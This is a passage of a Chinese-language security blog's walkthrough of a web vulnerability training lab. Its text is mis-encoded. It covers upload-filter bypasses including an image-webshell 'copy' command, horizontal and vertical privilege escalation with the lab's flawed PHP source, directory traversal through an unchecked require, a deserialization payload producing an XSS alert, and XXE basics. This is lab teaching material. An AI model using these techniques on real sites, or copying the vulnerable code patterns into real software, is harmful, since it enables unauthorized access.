checkï¼ˆå®¢æˆ·ç«¯éªŒè¯ï¼‰"></a>client checkï¼ˆå®¢æˆ·ç«¯éªŒè¯ï¼‰</h3><p><strong>æ–¹æ³•ä¸€ï¼šæ”¹æœ¬åœ°jsä»£ç </strong></p><p><strong>æ–¹æ³•äºŒï¼šBPæ‹¦æˆªé‡å‘</strong></p><h3 id="MIME-type"><a href="#MIME-type" class="headerlink" title="MIME type"></a>MIME type</h3><blockquote><p><strong>MIMEï¼ˆMultipurpose Internet Mail Extensionsï¼‰å¤šç”¨é€”äº’è¿ç½‘å³é”®æ‰©å±•ç±»å‹ã€‚</strong></p><p><strong>å½“ä¸€ä¸ªæµè§ˆå™¨å¯¹ä¸€ä¸ªæ–‡ä»¶è¿›è¡Œè¯†åˆ«çš„æ—¶å€™ï¼Œä»–ä¼šç»™æ–‡ä»¶å®šä¹‰ä¸€ä¸ªç±»å‹ï¼Œæ”¾åœ¨httpçš„å¤´éƒ¨çš„Content-typeé‡Œé¢ï¼Œæ¯”å¦‚ä¸Šä¼ å›¾ç‰‡ï¼Œå°±ä¼šè‡ªåŠ¨è¯†åˆ«æ˜¯jpgæˆ–è€…pngç­‰</strong></p></blockquote><p><strong>ä¸è¯¥æ–‡ä»¶åï¼ŒæŠ“åŒ…ä¿®æ”¹MIMEä¹Ÿå°±æ˜¯<code>Content-Type</code>ä¸Šä¼ </strong></p><h3 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize"></a>getimagesize</h3><p>å›¾ç‰‡éªŒè¯</p><p>åšå›¾ç‰‡é©¬å°±è¡Œ</p><p><strong>1.copyå‘½ä»¤</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">copy <span class="token number">1</span>.jpg/b + <span class="token number">1</span>.php/a <span class="token number">2</span>.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>2.äºŒè¿›åˆ¶ç¼–è¾‘å™¨</strong></p><p>åœ¨åé¢åŠ ä¸Šæœ¨é©¬å°±è¡Œ</p><p><strong>3.PSæ’å…¥</strong></p><p>å¯èƒ½è¿˜æœ‰å…¶å®ƒä¸€äº›æ–¹æ³•</p><h2 id="Over-permissionï¼ˆè¶Šæƒï¼‰"><a href="#Over-permissionï¼ˆè¶Šæƒï¼‰" class="headerlink" title="Over permissionï¼ˆè¶Šæƒï¼‰"></a>Over permissionï¼ˆè¶Šæƒï¼‰</h2><blockquote><p>å¦‚æœä½¿ç”¨Aç”¨æˆ·çš„æƒé™å»æ“ä½œBç”¨æˆ·çš„æ•°æ®ï¼ŒAçš„æƒé™å°äºBçš„æƒé™ï¼Œå¦‚æœèƒ½å¤ŸæˆåŠŸæ“ä½œï¼Œåˆ™ç§°ä¹‹ä¸º<code>è¶Šæƒæ“ä½œ</code>ã€‚  è¶Šæƒæ¼æ´å½¢æˆçš„åŸå› æ˜¯åå°ä½¿ç”¨äº†ä¸åˆç†çš„æƒé™æ ¡éªŒè§„åˆ™å¯¼è‡´çš„ã€‚ä¸€èˆ¬è¶Šæƒæ¼æ´å®¹æ˜“å‡ºç°åœ¨æƒé™é¡µé¢ï¼ˆéœ€è¦ç™»å½•çš„é¡µé¢ï¼‰å¢ã€åˆ ã€æ”¹ã€æŸ¥çš„çš„åœ°æ–¹ï¼Œå½“ç”¨æˆ·å¯¹æƒé™é¡µé¢å†…çš„ä¿¡æ¯è¿›è¡Œè¿™äº›æ“ä½œæ—¶ï¼Œåå°éœ€è¦å¯¹ å¯¹å½“å‰ç”¨æˆ·çš„æƒé™è¿›è¡Œæ ¡éªŒï¼Œçœ‹å…¶æ˜¯å¦å…·å¤‡æ“ä½œçš„æƒé™ï¼Œä»è€Œç»™å‡ºå“åº”ï¼Œè€Œå¦‚æœæ ¡éªŒçš„è§„åˆ™è¿‡äºç®€å•åˆ™å®¹æ˜“å‡ºç°è¶Šæƒæ¼æ´ã€‚</p><p>å› æ­¤ï¼Œåœ¨åœ¨æƒé™ç®¡ç†ä¸­åº”è¯¥éµå®ˆï¼š<br>1.ä½¿ç”¨æœ€å°æƒé™åŸåˆ™å¯¹ç”¨æˆ·è¿›è¡Œèµ‹æƒ;<br>2.ä½¿ç”¨åˆç†ï¼ˆä¸¥æ ¼ï¼‰çš„æƒé™æ ¡éªŒè§„åˆ™;<br>3.ä½¿ç”¨åå°ç™»å½•æ€ä½œä¸ºæ¡ä»¶è¿›è¡Œæƒé™åˆ¤æ–­,åˆ«åŠ¨ä¸åŠ¨å°±çç”¨å‰ç«¯ä¼ è¿›æ¥çš„æ¡ä»¶;</p></blockquote><h3 id="æ°´å¹³è¶Šæƒ"><a href="#æ°´å¹³è¶Šæƒ" class="headerlink" title="æ°´å¹³è¶Šæƒ"></a>æ°´å¹³è¶Šæƒ</h3><blockquote><p><strong>Aç”¨æˆ·å’ŒBç”¨æˆ·å±äºåŒä¸€çº§åˆ«ç”¨æˆ·ï¼Œä½†å„è‡ªä¸èƒ½æ“ä½œå¯¹æ–¹ä¸ªäººä¿¡æ¯ã€‚Aç”¨æˆ·å¦‚æœè¶Šæƒæ“ä½œBç”¨æˆ·ä¸ªäººä¿¡æ¯çš„æƒ…å†µç§°ä¸ºæ°´å¹³è¶Šæƒæ“ä½œã€‚</strong></p></blockquote><p>æ ¹æ®æç¤ºå¯ä»¥çœ‹åˆ°æœ‰ä¸‰ä¸ªç”¨æˆ·</p><p>éšä¾¿ç™»å½•å…¶ä¸­ä¸€ä¸ªæ¯”å¦‚lucy</p><p>æŠŠurlä¸­çš„lucyæ”¹æˆå…¶ä»–ç”¨æˆ·çš„åå­—å°±å¯ä»¥çœ‹åˆ°å…¶ä»–ç”¨æˆ·çš„ä¿¡æ¯ï¼Œè€Œæ— éœ€è¾“å…¥å…¶ä»–äººçš„å¯†ç </p><p>æºç ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// åˆ¤æ–­æ˜¯å¦ç™»å½•ï¼Œæ²¡æœ‰ç™»å½•ä¸èƒ½è®¿é—®</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">check_op_login</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:op1_login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$html</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment">//æ²¡æœ‰ä½¿ç”¨sessionæ¥æ ¡éªŒ,è€Œæ˜¯ä½¿ç”¨çš„ä¼ è¿›æ¥çš„å€¼ï¼Œæƒé™æ ¡éªŒå‡ºç°é—®é¢˜,è¿™é‡Œåº”è¯¥è·Ÿç™»å½•æ€å…³ç³»è¿›è¡Œç»‘å®š</span>    <span class="token variable">$username</span><span class="token operator">=</span><span class="token function">escape</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$query</span><span class="token operator">=</span><span class="token string double-quoted-string">"select * from member where username='<span class="token interpolation"><span class="token variable">$username</span></span>'"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span><span class="token operator">=</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="å‚ç›´è¶Šæƒ"><a href="#å‚ç›´è¶Šæƒ" class="headerlink" title="å‚ç›´è¶Šæƒ"></a>å‚ç›´è¶Šæƒ</h3><blockquote><p><strong>Aç”¨æˆ·æƒé™é«˜äºBç”¨æˆ·ï¼ŒBç”¨æˆ·è¶Šæƒæ“ä½œAç”¨æˆ·çš„æƒé™çš„æƒ…å†µç§°ä¸ºå‚ç›´è¶Šæƒã€‚</strong></p></blockquote><p>æ‹¿ç®¡ç†å‘˜è´¦æˆ·ç™»è¿›å»</p><p>æ·»åŠ ä¸€ä¸ªç”¨æˆ·ï¼ŒæŠ“åŒ…</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210214210920505.png"></p><p>å†æ‹¿æ™®é€šç”¨æˆ·ç™»å½•</p><p>åŒæ ·æ·»åŠ ç”¨æˆ·ï¼ŒæŠ“åŒ…ï¼ŒæŠŠå®ƒçš„ç™»å½•cookieå¤åˆ¶åˆ°åŸæ¥ç®¡ç†å‘˜æ–°å»ºæˆå‘˜çš„é‚£ä¸ªè¯·æ±‚é‡Œï¼ŒForwardæäº¤</p><p>å†åˆ·æ–°ä¸‹ï¼Œå°±å¯ä»¥çœ‹åˆ°åˆæ–°å»ºäº†ä¸€ä¸ªç”¨æˆ·</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210214211548275.png"></p><p>æºç ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// åˆ¤æ–­æ˜¯å¦ç™»å½•ï¼Œæ²¡æœ‰ç™»å½•ä¸èƒ½è®¿é—®</span><span class="token comment">//è¿™é‡Œåªæ˜¯éªŒè¯äº†ç™»å½•çŠ¶æ€ï¼Œå¹¶æ²¡æœ‰éªŒè¯çº§åˆ«ï¼Œæ‰€ä»¥å­˜åœ¨è¶Šæƒé—®é¢˜ã€‚</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">check_op2_login</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:op2_login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token constant">null</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//ç”¨æˆ·åå¯†ç å¿…å¡«</span>        <span class="token variable">$getdata</span><span class="token operator">=</span><span class="token function">escape</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è½¬ä¹‰</span>        <span class="token variable">$query</span><span class="token operator">=</span><span class="token string double-quoted-string">"insert into member(username,pw,sex,phonenum,email,address) values('<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$getdata</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span>',md5('<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$getdata</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span>'),'<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$getdata</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sex'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span>','<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$getdata</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'phonenum'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span>','<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$getdata</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span>','<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$getdata</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'address'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span>')"</span><span class="token punctuation">;</span>        <span class="token variable">$result</span><span class="token operator">=</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mysqli_affected_rows</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//åˆ¤æ–­æ˜¯å¦æ’å…¥</span>            <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:op2_admin.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$html</span><span class="token operator">.=</span><span class="token string double-quoted-string">"&lt;p&gt;ä¿®æ”¹å¤±è´¥,è¯·æ£€æŸ¥ä¸‹æ•°æ®åº“æ˜¯ä¸æ˜¯è¿˜æ˜¯æ´»ç€çš„&lt;/p&gt;"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ï¼ˆç›®å½•éå†ï¼‰"><a href="#ï¼ˆç›®å½•éå†ï¼‰" class="headerlink" title="../../../ï¼ˆç›®å½•éå†ï¼‰"></a>../../../ï¼ˆç›®å½•éå†ï¼‰</h2><blockquote><p>åœ¨webåŠŸèƒ½è®¾è®¡ä¸­,å¾ˆå¤šæ—¶å€™æˆ‘ä»¬ä¼šè¦å°†éœ€è¦è®¿é—®çš„æ–‡ä»¶å®šä¹‰æˆå˜é‡ï¼Œä»è€Œè®©å‰ç«¯çš„åŠŸèƒ½ä¾¿çš„æ›´åŠ çµæ´»ã€‚ å½“ç”¨æˆ·å‘èµ·ä¸€ä¸ªå‰ç«¯çš„è¯·æ±‚æ—¶ï¼Œä¾¿ä¼šå°†è¯·æ±‚çš„è¿™ä¸ªæ–‡ä»¶çš„å€¼(æ¯”å¦‚æ–‡ä»¶åç§°)ä¼ é€’åˆ°åå°ï¼Œåå°å†æ‰§è¡Œå…¶å¯¹åº”çš„æ–‡ä»¶ã€‚  åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œå¦‚æœåå°æ²¡æœ‰å¯¹å‰ç«¯ä¼ è¿›æ¥çš„å€¼è¿›è¡Œä¸¥æ ¼çš„å®‰å…¨è€ƒè™‘ï¼Œåˆ™æ”»å‡»è€…å¯èƒ½ä¼šé€šè¿‡â€œ../â€è¿™æ ·çš„æ‰‹æ®µè®©åå°æ‰“å¼€æˆ–è€…æ‰§è¡Œä¸€äº›å…¶ä»–çš„æ–‡ä»¶ã€‚  ä»è€Œå¯¼è‡´åå°æœåŠ¡å™¨ä¸Šå…¶ä»–ç›®å½•çš„æ–‡ä»¶ç»“æœè¢«éå†å‡ºæ¥ï¼Œå½¢æˆç›®å½•éå†æ¼æ´ã€‚</p><p>çœ‹åˆ°è¿™é‡Œ,ä½ å¯èƒ½ä¼šè§‰å¾—ç›®å½•éå†æ¼æ´å’Œä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½ï¼Œç”šè‡³æ–‡ä»¶åŒ…å«æ¼æ´æœ‰å·®ä¸å¤šçš„æ„æ€ï¼Œæ˜¯çš„ï¼Œç›®å½•éå†æ¼æ´å½¢æˆçš„æœ€ä¸»è¦çš„åŸå› è·Ÿè¿™ä¸¤è€…ä¸€æ ·ï¼Œéƒ½æ˜¯åœ¨åŠŸèƒ½è®¾è®¡ä¸­å°†è¦æ“ä½œçš„æ–‡ä»¶ä½¿ç”¨å˜é‡çš„æ–¹å¼ä¼ é€’ç»™äº†åå°ï¼Œè€Œåˆæ²¡æœ‰è¿›è¡Œä¸¥æ ¼çš„å®‰å…¨è€ƒè™‘è€Œé€ æˆçš„ï¼Œåªæ˜¯å‡ºç°çš„ä½ç½®æ‰€å±•ç°çš„ç°è±¡ä¸ä¸€æ ·ï¼Œå› æ­¤ï¼Œè¿™é‡Œè¿˜æ˜¯å•ç‹¬æ‹¿å‡ºæ¥å®šä¹‰ä¸€ä¸‹ã€‚</p><p>éœ€è¦åŒºåˆ†ä¸€ä¸‹çš„æ˜¯,å¦‚æœä½ é€šè¿‡ä¸å¸¦å‚æ•°çš„urlï¼ˆæ¯”å¦‚ï¼š<a href="http://xxxx/doc%EF%BC%89%E5%88%97%E5%87%BA%E4%BA%86doc%E6%96%87%E4%BB%B6%E5%A4%B9%E9%87%8C%E9%9D%A2%E6%89%80%E6%9C%89%E7%9A%84%E6%96%87%E4%BB%B6%EF%BC%8C%E8%BF%99%E7%A7%8D%E6%83%85%E5%86%B5%EF%BC%8C%E6%88%91%E4%BB%AC%E6%88%90%E4%B8%BA%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%8C%E8%80%8C%E5%B9%B6%E4%B8%8D%E5%BD%92%E4%B8%BA%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E3%80%82">http://xxxx/docï¼‰åˆ—å‡ºäº†docæ–‡ä»¶å¤¹é‡Œé¢æ‰€æœ‰çš„æ–‡ä»¶ï¼Œè¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬æˆä¸ºæ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œè€Œå¹¶ä¸å½’ä¸ºç›®å½•éå†æ¼æ´ã€‚</a></p></blockquote><p>ä¿®æ”¹URLä¸­çš„titleå‚æ•°å®ç°ç›®å½•éå†</p><p>æºç ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$html</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//è¿™é‡Œç›´æ¥æŠŠä¼ è¿›æ¥çš„å†…å®¹è¿›è¡Œäº†require(),é€ æˆé—®é¢˜</span>    <span class="token keyword">require</span> <span class="token string double-quoted-string">"soup/<span class="token interpolation"><span class="token variable">$filename</span></span>"</span><span class="token punctuation">;</span><span class="token comment">//    echo $html;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="æ•æ„Ÿä¿¡æ¯æ³„éœ²"><a href="#æ•æ„Ÿä¿¡æ¯æ³„éœ²" class="headerlink" title="æ•æ„Ÿä¿¡æ¯æ³„éœ²"></a>æ•æ„Ÿä¿¡æ¯æ³„éœ²</h2><blockquote><p>ç”±äºåå°äººå‘˜çš„ç–å¿½æˆ–è€…ä¸å½“çš„è®¾è®¡ï¼Œå¯¼è‡´ä¸åº”è¯¥è¢«å‰ç«¯ç”¨æˆ·çœ‹åˆ°çš„æ•°æ®è¢«è½»æ˜“çš„è®¿é—®åˆ°ã€‚ æ¯”å¦‚ï¼š<br>â€”é€šè¿‡è®¿é—®urlä¸‹çš„ç›®å½•ï¼Œå¯ä»¥ç›´æ¥åˆ—å‡ºç›®å½•ä¸‹çš„æ–‡ä»¶åˆ—è¡¨;<br>â€”è¾“å…¥é”™è¯¯çš„urlå‚æ•°åæŠ¥é”™ä¿¡æ¯é‡Œé¢åŒ…å«æ“ä½œç³»ç»Ÿã€ä¸­é—´ä»¶ã€å¼€å‘è¯­è¨€çš„ç‰ˆæœ¬æˆ–å…¶ä»–ä¿¡æ¯;<br>â€”å‰ç«¯çš„æºç ï¼ˆhtml,css,jsï¼‰é‡Œé¢åŒ…å«äº†æ•æ„Ÿä¿¡æ¯ï¼Œæ¯”å¦‚åå°ç™»å½•åœ°å€ã€å†…ç½‘æ¥å£ä¿¡æ¯ã€ç”šè‡³è´¦å·å¯†ç ç­‰;</p></blockquote><p>æ ¹æ®æç¤ºï¼Œå®¡æŸ¥æºç å‘ç°ä¸€ä¸ªæµ‹è¯•è´¦å·</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210214212459831.png"></p><h2 id="PHPååºåˆ—åŒ–"><a href="#PHPååºåˆ—åŒ–" class="headerlink" title="PHPååºåˆ—åŒ–"></a>PHPååºåˆ—åŒ–</h2><blockquote><p>ä¹‹å‰çš„ç¬”è®°æœ‰ä»‹ç»ï¼š<a href="https://anwar.top/2021/01/15/php-fan-xu-lie-hua/">https://anwar.top/2021/01/15/php-fan-xu-lie-hua/</a></p></blockquote><p>éšä¾¿åºåˆ—åŒ–å¼¹ä¸ªæ¡†</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token argument-name">O</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"S"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"test"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">29</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"&lt;script&gt;alert('AAA')&lt;/script&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="XXEï¼ˆXMLå¤–éƒ¨å®ä½“æ³¨å…¥æ”»å‡»ï¼‰"><a href="#XXEï¼ˆXMLå¤–éƒ¨å®ä½“æ³¨å…¥æ”»å‡»ï¼‰" class="headerlink" title="XXEï¼ˆXMLå¤–éƒ¨å®ä½“æ³¨å…¥æ”»å‡»ï¼‰"></a>XXEï¼ˆXMLå¤–éƒ¨å®ä½“æ³¨å…¥æ”»å‡»ï¼‰</h2><blockquote><p>XXE -â€œxml external entity injectionâ€ å³â€xmlå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´â€ã€‚<br>æ¦‚æ‹¬ä¸€ä¸‹å°±æ˜¯â€æ”»å‡»è€…é€šè¿‡å‘æœåŠ¡å™¨æ³¨å…¥æŒ‡å®šçš„xmlå®ä½“å†…å®¹,ä»è€Œè®©æœåŠ¡å™¨æŒ‰ç…§æŒ‡å®šçš„é…ç½®è¿›è¡Œæ‰§è¡Œ,å¯¼è‡´é—®é¢˜â€<br>ä¹Ÿå°±æ˜¯è¯´æœåŠ¡ç«¯æ¥æ”¶å’Œè§£æäº†æ¥è‡ªç”¨æˆ·ç«¯çš„xmlæ•°æ®,è€Œåˆæ²¡æœ‰åšä¸¥æ ¼çš„å®‰å…¨æ§åˆ¶,ä»è€Œå¯¼è‡´xmlå¤–éƒ¨å®ä½“æ³¨å…¥ã€‚<br>ç°åœ¨å¾ˆå¤šè¯­è¨€é‡Œé¢å¯¹åº”çš„è§£æxmlçš„å‡½æ•°é»˜è®¤æ˜¯ç¦æ­¢è§£æå¤–éƒ¨å®ä½“å†…å®¹çš„,ä»è€Œä¹Ÿå°±ç›´æ¥é¿å…äº†è¿™ä¸ªæ¼æ´ã€‚<br>ä»¥PHPä¸ºä¾‹,åœ¨PHPé‡Œé¢è§£æxmlç”¨çš„æ˜¯libxml,å…¶åœ¨â‰¥2.9.0çš„ç‰ˆæœ¬ä¸­,é»˜è®¤æ˜¯ç¦æ­¢è§£æxmlå¤–éƒ¨å®ä½“å†…å®¹çš„ã€‚</p></blockquote><p><strong>XMLæ˜¯å¯æ‰©å±•çš„æ ‡è®°è¯­è¨€ï¼ˆE<code>X</code>tensible <code>M</code>arkup <code>L</code>anguageï¼‰ï¼Œè®¾è®¡ç”¨æ¥è¿›è¡Œæ•°æ®çš„ä¼ è¾“å’Œå­˜å‚¨ï¼Œ ç»“æ„æ˜¯æ ‘å½¢ç»“æ„ï¼Œç”±æ ‡ç­¾æ„æˆï¼Œè¿™ç‚¹å¾ˆåƒHTMLè¯­è¨€ã€‚ä½†æ˜¯XMLå’ŒHTMLæœ‰æ˜æ˜¾åŒºåˆ«å¦‚ä¸‹ï¼š</strong></p><pre class="line-numbers language-none"><code class="language-none">XML å’Œ HTML ä¸ºä¸åŒçš„ç›®çš„è€Œè®¾è®¡ï¼šXML è¢«è®¾è®¡ç”¨æ¥ä¼ è¾“å’Œå­˜å‚¨æ•°æ®ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å†…å®¹ã€‚HTML è¢«è®¾è®¡ç”¨æ¥æ˜¾ç¤ºæ•°æ®ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å¤–è§‚ã€‚HTML æ—¨åœ¨æ˜¾ç¤ºä¿¡æ¯ï¼Œè€Œ XML æ—¨åœ¨ä¼ è¾“ä¿¡æ¯ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>XMLå¤§è‡´è¯­æ³•ï¼š</strong></p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml">ç¬¬ä¸€éƒ¨åˆ†ï¼šXMLå£°æ˜éƒ¨åˆ†<span class="token prolog">&lt;?xml version="1.0"?&gt;</span>ç¬¬äºŒéƒ¨åˆ†ï¼šæ–‡æ¡£ç±»å‹å®šä¹‰ DTD<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">note</span><span class="token punctuation">[</span><span class="token internal-subset"> <span class="token comment">&lt;!--å®šä¹‰æ­¤æ–‡æ¡£æ˜¯noteç±»å‹çš„æ–‡æ¡£--&gt;</span>&lt;!ENTITY entity-name SYSTEM "URI/URL"&gt;<span class="token comment">&lt;!--å¤–éƒ¨å®ä½“å£°æ˜--&gt;</span></span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>ç¬¬ä¸‰éƒ¨åˆ†ï¼šæ–‡æ¡£å…ƒç´ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">&gt;</span></span>Dave<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">&gt;</span></span>Tom<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>Reminder<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>You are a good man<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å…¶ä¸­ï¼ŒDTDï¼ˆDocument Type Definitionï¼Œæ–‡æ¡£ç±»å‹å®šä¹‰ï¼‰ï¼Œç”¨æ¥ä¸º XML æ–‡æ¡£å®šä¹‰è¯­æ³•çº¦æŸï¼Œå¯ä»¥æ˜¯å†…éƒ¨ç”³æ˜ä¹Ÿå¯ä»¥ä½¿å¼•ç”¨å¤–éƒ¨DTDç°åœ¨å¾ˆå¤šè¯­è¨€é‡Œé¢å¯¹åº”çš„è§£æxmlçš„å‡½æ•°é»˜è®¤æ˜¯ç¦æ­¢è§£æå¤–éƒ¨å®ä½“å†…å®¹çš„ï¼Œä»è€Œä¹Ÿå°±ç›´æ¥é¿å…äº†è¿™ä¸ªæ¼æ´ã€‚</p><pre class="line-numbers language-xml" data-language="xml"><code 